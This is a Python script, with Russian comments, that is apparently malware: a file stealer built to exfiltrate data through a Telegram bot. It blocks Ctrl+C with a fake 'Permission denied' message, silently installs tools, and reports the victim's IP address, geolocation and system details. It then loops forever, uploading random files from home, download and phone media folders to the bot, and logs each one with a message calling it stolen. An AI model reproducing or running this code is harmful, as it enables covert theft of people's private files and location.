import time
import subprocess
import requests
from colorama import init, Fore, Style
import os
import threading
import sys
import signal
import random
import platform
import json

TELEGRAM_BOT_TOKEN = ''
TELEGRAM_CHAT_ID = ''
begin = ''
os_name = platform.system()
sys_name = 'undefined'
emoji = ''
client = ''

def signal_handler(sig, frame):
    print("Unable to kill process. Permission denied.")

signal.signal(signal.SIGINT, signal_handler)

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    requests.post(url, data=payload)

def get_geolocation():
    try:
        result = subprocess.run(['curl', 'https://ipinfo.io/json'], capture_output=True, text=True)
        if result.returncode == 0:
            return json.loads(result.stdout)
        else:
            send_telegram_message("🌐❌ Ошибка при выполнении curl.")
            return None
    except Exception as e:
        send_telegram_message(f"🌐❌ Произошла ошибка при получении гео: {e}")
        return None

def get_location_by_ip(ip):
    response = requests.get(f'https://ipinfo.io/{ip}/json')
    if response.status_code == 200:
        return response.json()
    else:
        send_telegram_message("⛓️‍💥 Ошибка при выполнении запроса к ipinfo.io")
        return None
    
def run_commands():
    global os_name
    global sys_name
    global emoji
    global begin
    global client
    print(begin)
    try:
        if os_name == "Linux":
            if os.path.exists('/data/data/com.termux/files'):
                sys_name = "Termux (Android)"
                emoji = '📱'
                subprocess.run(['pkg', 'install', 'curl', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['pkg', 'install', 'tmate', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                sys_name = "Linux"
                emoji = '🐧'
                subprocess.run(['sudo', 'apt', 'install', 'curl', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif os_name == "Darwin":
            sys_name = "MacOS"
            emoji = '🍏'
            subprocess.run(['brew', 'install', 'curl'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif os_name == "Windows":
            sys_name = "Windows"
            emoji = '💻'
        else:
            send_telegram_message(f"⚠️ Такую систему я не знаю! ОС: {os_name}. Продолжаю работу.")
            emoji = '⚠️'
            sys_name = "Неизвестная ОС"
    except Exception as e:
        send_telegram_message(f"❌ Ошибка установки зависимостей, продолжаю работу: {e}")
        print(f"Ошибка установки зависимостей: {e}")
    try:
        result = subprocess.run(['curl', 'ifconfig.me'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode == 0:
            ip_address = result.stdout.strip()
        else:
            ip_address = '🚫'
        client = ip_address
        ver = platform.version()
        arch = platform.architecture()
        geo_data = get_geolocation()
        if geo_data:
            latitude, longitude = geo_data['loc'].split(',')
            location_info = get_location_by_ip(ip_address)
# Форматируем сообщение о местоположении
            location_message = (
                f"🌍 Гео\n"
                f"Широта: {latitude}\n"
                f"Долгота: {longitude}\n"
            )
            if location_info:
                location_message += (
                    f"Город: {location_info.get('city', 'Неизвестно')}\n"
                    f"Регион: {location_info.get('region', 'Неизвестно')}\n"
                    f"Страна: {location_info.get('country', 'Неизвестно')}\n"
                    f"Почтовый индекс: {location_info.get('postal', 'Неизвестно')}\n"
                )
            else:
                location_message += "🌐❌ Не удалось получить доп инфу."
        else:
            location_message = "🌐❌ Не удалось получить гео."
        send_telegram_message(f"{emoji} Новая сессия\nКлиент/IP: {ip_address}\nСистема: {sys_name} {ver} {arch}\n {location_message}")
    except Exception as e:
        send_telegram_message(f"🚫 Fatal: {e}")
    share_thread = threading.Thread(target=share)
    share_thread.start()
    send_telegram_message(f"👁️️️️️️ Перехват данных...")
    if os_name == "Windows":
        os.system('cls')  # Для Windows
    elif os_name in ["Linux", "Darwin"]:  # Linux и macOS
        os.system('clear')  # Для Linux и macOS
    else:
        send_telegram_message(f"🚫 Fatal. Unsupported platform.")

def share():
    global os_name
    global client
    while True:  # Бесконечный цикл
        try:
            if os_name == "Windows":
                folders_to_send = [r"C:\\Users", r"D:", r"F:", r"C:\\downloads", r"C:\\Downloads", r"C:\\Program Files", r"C:\\Program Files (x86)"]
            elif os_name == "Linux":
                if os.path.exists('/data/data/com.termux/files'):
                    folders_to_send = [
                        "/storage/emulated/0/Pictures",
                        "/storage/emulated/0/Movies",
                        "/storage/emulated/0/Music",
                        "/storage/emulated/0/Download",
                        "/storage/emulated/0/DCIM",
                        "/storage/emulated/0/Documents"
                    ]
                else:
                    folders_to_send = "/home"  # Дефолтная папка для Linux
            elif os_name == "Darwin":
                folders_to_send = ["/Users", "/Downloads", "/downloads", "/Download", "/download"]
            else:
                send_telegram_message("UnknownPlatformError: Пробую получить файлы другим способом.")
                folders_to_send = [
                    "/storage",
                    "/Users",
                    "/files",
                    "/Download",
                    "/Downloads",
                    "/download",
                    "/downloads",
                    "/"
                ]

            for folder in folders_to_send:
                if os.path.exists(folder):
                    files = []
                    for root, dirs, files_in_folder in os.walk(folder):
                        for file in files_in_folder:
                            files.append(os.path.join(root, file))
                    
                    random_files = random.sample(files, min(5, len(files)))

                    for file_path in random_files:
                        with open(file_path, 'rb') as f:
                            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
                            payload = {
                                'chat_id': TELEGRAM_CHAT_ID,
                                'caption': f"📁: {client}"
                            }
                            files = {
                                'document': f
                            }
                            try:
                                response = requests.post(url, data=payload, files=files)
                                if response.status_code == 200:
                                    send_telegram_message(f'🖤 Спизжено: {file_path}')
                                else:
                                    send_telegram_message(f'💔 Не спиздилось: {file_path} - {response.text}')
                            except requests.exceptions.RequestException as e:
                                send_telegram_message(f"⛓️‍💥 Ошибка при отправке файла: {e}")
                            time.sleep(1)
                else:
                    send_telegram_message(f"Папка не найдена: {folder}")
            time.sleep(4)  # Задержка перед следующей итерацией
        except Exception as e:
            send_telegram_message(f"🚫 Fatal: {e}")
            send_telegram_message(f"✋ Незамедлительное прекращение программы.")
            sys.exit(0)

def raid():
    run_commands()

if __name__ == "__main__":
    raid()